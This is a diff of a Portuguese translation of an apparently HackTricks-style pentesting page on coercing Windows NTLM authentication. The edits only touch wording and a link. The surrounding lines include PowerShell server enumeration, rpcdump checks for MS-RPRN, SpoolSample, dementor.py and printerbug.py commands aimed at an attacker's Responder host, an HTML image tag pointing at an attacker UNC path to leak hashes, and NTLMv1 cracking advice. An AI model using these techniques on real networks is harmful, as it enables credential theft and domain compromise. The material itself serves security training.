@@ -13,7 +13,7 @@ Observe que, quando a impressora envia a notificação para sistemas arbitrário
 
 ### Encontrando Servidores Windows no domínio
 
-Usando PowerShell, obtenha uma lista de máquinas Windows. Servidores geralmente têm prioridade, então vamos nos concentrar lá:
+Usando PowerShell, obtenha uma lista de máquinas Windows. Servidores geralmente são prioridade, então vamos focar lá:
 ```bash
 Get-ADComputer -Filter {(OperatingSystem -like "*windows*server*") -and (OperatingSystem -notlike "2016") -and (Enabled -eq "True")} -Properties * | select Name | ft -HideTableHeaders > servers.txt
 ```
@@ -28,13 +28,13 @@ Você também pode usar rpcdump.py no Linux e procurar pelo Protocolo MS-RPRN.
 ```bash
 rpcdump.py DOMAIN/USER:PASSWORD@SERVER.DOMAIN.COM | grep MS-RPRN
 ```
-### Peça ao serviço para se autenticar contra um host arbitrário
+### Peça ao serviço para autenticar contra um host arbitrário
 
 Você pode compilar[ **SpoolSample daqui**](https://github.com/NotMedic/NetNTLMtoSilverTicket)**.**
 ```bash
 SpoolSample.exe <TARGET> <RESPONDERIP>
 ```
-ou use [**dementor.py do 3xocyte**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) se você estiver no Linux
+ou use [**3xocyte's dementor.py**](https://github.com/NotMedic/NetNTLMtoSilverTicket) ou [**printerbug.py**](https://github.com/dirkjanm/krbrelayx/blob/master/printerbug.py) se você estiver no Linux
 ```bash
 python dementor.py -d domain -u username -p password <RESPONDERIP> <TARGET>
 printerbug.py 'domain/username:password'@<Printer IP> <RESPONDERIP>
@@ -94,7 +94,7 @@ Se você souber o **endereço de email** do usuário que faz login em uma máqui
 ```html
 <img src="\\10.10.17.231\test.ico" height="1" width="1" />
 ```
-e quando ele abrir, ele tentará se autenticar.
+e quando ele o abrir, ele tentará se autenticar.
 
 ### MitM
 
@@ -104,7 +104,7 @@ Se você puder realizar um ataque MitM a um computador e injetar HTML em uma pá
 ```
 ## Quebrando NTLMv1
 
-Se você conseguir capturar [desafios NTLMv1 leia aqui como quebrá-los](../ntlm/#ntlmv1-attack).\
+Se você pode capturar [desafios NTLMv1 leia aqui como quebrá-los](../ntlm/index.html#ntlmv1-attack).\
 &#xNAN;_&#x52;emember que para quebrar NTLMv1 você precisa definir o desafio do Responder como "1122334455667788"_
 
 {{#include ../../banners/hacktricks-training.md}}
